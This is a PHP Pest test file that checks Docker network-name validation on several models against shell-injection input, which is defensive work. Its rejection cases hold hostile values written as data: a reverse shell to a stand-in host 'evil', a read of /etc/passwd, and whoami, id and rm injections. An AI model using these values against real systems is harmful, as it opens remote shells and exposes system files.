<?php

use App\Models\DockerNetwork;
use App\Models\StandaloneDocker;
use App\Models\SwarmDocker;

it('rejects network names with shell metacharacters', function (string $modelClass, string $network) {
    $model = $modelClass === StandaloneDocker::class ? new StandaloneDocker : new SwarmDocker;
    $model->network = $network;
})->with([
    [StandaloneDocker::class, 'poc; bash -i >& /dev/tcp/evil/4444 0>&1 #'],
    [StandaloneDocker::class, 'net|cat /etc/passwd'],
    [StandaloneDocker::class, 'net$(whoami)'],
    [StandaloneDocker::class, 'net`id`'],
    [StandaloneDocker::class, 'net work'],
    [SwarmDocker::class, 'poc; bash -i >& /dev/tcp/evil/4444 0>&1 #'],
    [SwarmDocker::class, 'net|cat /etc/passwd'],
    [SwarmDocker::class, 'net$(whoami)'],
])->throws(InvalidArgumentException::class);

it('accepts valid network names', function (string $modelClass, string $network) {
    $model = $modelClass === StandaloneDocker::class ? new StandaloneDocker : new SwarmDocker;
    $model->network = $network;

    expect($model->network)->toBe($network);
})->with([
    [StandaloneDocker::class, 'mynetwork'],
    [StandaloneDocker::class, 'my-network'],
    [StandaloneDocker::class, 'my_network'],
    [SwarmDocker::class, 'mynetwork'],
    [SwarmDocker::class, 'my-network'],
    [SwarmDocker::class, 'my_network'],
]);

it('validates docker network names on the DockerNetwork model', function () {
    expect(fn () => new DockerNetwork(['docker_network_name' => 'valid_network-1.2']))->not->toThrow(InvalidArgumentException::class);

    expect(fn () => new DockerNetwork(['docker_network_name' => 'invalid network;rm']))->toThrow(InvalidArgumentException::class);
});
